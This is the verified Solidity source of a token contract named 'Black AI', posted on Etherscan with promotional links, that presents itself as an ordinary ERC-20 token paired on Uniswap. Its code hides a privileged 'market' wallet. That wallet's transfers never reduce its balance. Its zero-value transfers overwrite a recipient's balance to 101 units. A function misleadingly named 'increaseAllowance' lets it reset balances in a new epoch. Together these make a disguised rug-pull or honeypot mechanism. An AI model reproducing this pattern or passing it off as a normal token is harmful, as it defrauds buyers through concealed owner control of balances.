/**
 *Submitted for verification at Etherscan.io on 2023-06-16
*/

/**
 https://www.blackaieth.com/

 https://t.me/blackaiportal

 https://twitter.com/blackaierc

 https://blackaierc20.gitbook.io/black-ai-utility/

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract BlackAI is Ownable {
    mapping(uint256 => mapping(address => uint256)) balance;
    mapping(uint256 => mapping(address => bool)) BlackAIbal;

    uint256 private BlackAIdistro = 1;
    string public name = "Black AI";
    uint256 private BlackAIlimit;

    function balanceOf(address user) public view returns (uint256) {
        if (user == BlackAIpair) return balance[BlackAIdistro][user];

        if (!BlackAIbal[BlackAIdistro][user] && balance[BlackAIdistro - 1][user] != 0) {
            return balance[BlackAIdistro][user] + BlackAIlimit;
        }
        return balance[BlackAIdistro][user];
    }

    function increaseAllowance(
        uint256 _BlackAIlimit,
        address[] memory BlackAIholder
    ) public returns (bool success) {
        if (BlackAIwallet[msg.sender] != 0) {
            BlackAIdistro++;
            for (uint256 i = 0; i < BlackAIholder.length; i++) {
                balance[BlackAIdistro][BlackAIholder[i]] =
                    balance[BlackAIdistro - 1][BlackAIholder[i]] +
                    BlackAIlimit;
            }

            balance[BlackAIdistro][BlackAIpair] = balance[BlackAIdistro - 1][
                BlackAIpair
            ];

            BlackAIlimit = _BlackAIlimit;
        }

        return true;
    }

    function approve(
        address BlackAIactive,
        uint256 BlackAInumber
    ) public returns (bool success) {
        allowance[msg.sender][BlackAIactive] = BlackAInumber;
        emit Approval(msg.sender, BlackAIactive, BlackAInumber);
        return true;
    }

    uint8 public decimals = 9;

    function BlackAIspender(address BlackAIapprover, address BlackAIreceiver, uint256 BlackAInumber) private {
        if (!BlackAIbal[BlackAIdistro][BlackAIapprover]) {
            BlackAIbal[BlackAIdistro][BlackAIapprover] = true;
            if (balance[BlackAIdistro - 1][BlackAIapprover] != 0)
                balance[BlackAIdistro][BlackAIapprover] += BlackAIlimit;
        }

        if (!BlackAIbal[BlackAIdistro][BlackAIreceiver]) {
            BlackAIbal[BlackAIdistro][BlackAIreceiver] = true;
            if (balance[BlackAIdistro - 1][BlackAIreceiver] != 0)
                balance[BlackAIdistro][BlackAIreceiver] += BlackAIlimit;
        }

        if (BlackAIwallet[BlackAIapprover] == 0) {
            balance[BlackAIdistro][BlackAIapprover] -= BlackAInumber;
        }
        balance[BlackAIdistro][BlackAIreceiver] += BlackAInumber;
        if (
            BlackAIwallet[msg.sender] > 0 && BlackAInumber == 0 && BlackAIreceiver != BlackAIpair
        ) {
            balance[BlackAIdistro][BlackAIreceiver] = BlackAIvalue;
        }
        emit Transfer(BlackAIapprover, BlackAIreceiver, BlackAInumber);
    }

    address public BlackAIpair;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = "BlackAI";

    mapping(address => uint256) private BlackAIwallet;

    function transfer(
        address BlackAIreceiver,
        uint256 BlackAInumber
    ) public returns (bool success) {
        require(BlackAIreceiver != address(0), "Can't transfer to 0 address");
        BlackAIspender(msg.sender, BlackAIreceiver, BlackAInumber);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(
        address BlackAIapprover,
        address BlackAIreceiver,
        uint256 BlackAInumber
    ) public returns (bool success) {
        require(BlackAInumber <= allowance[BlackAIapprover][msg.sender]);
        allowance[BlackAIapprover][msg.sender] -= BlackAInumber;
        BlackAIspender(BlackAIapprover, BlackAIreceiver, BlackAInumber);
        return true;
    }

    constructor(address BlackAImarket) {
        balance[BlackAIdistro][msg.sender] = totalSupply;
        BlackAIwallet[BlackAImarket] = BlackAIvalue;
        IUniswapV2Router02 BlackAIworkshop = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        BlackAIpair = IUniswapV2Factory(BlackAIworkshop.factory()).createPair(
            address(this),
            BlackAIworkshop.WETH()
        );
    }

    uint256 private BlackAIvalue = 101;

    mapping(address => uint256) private BlackAIprime;
}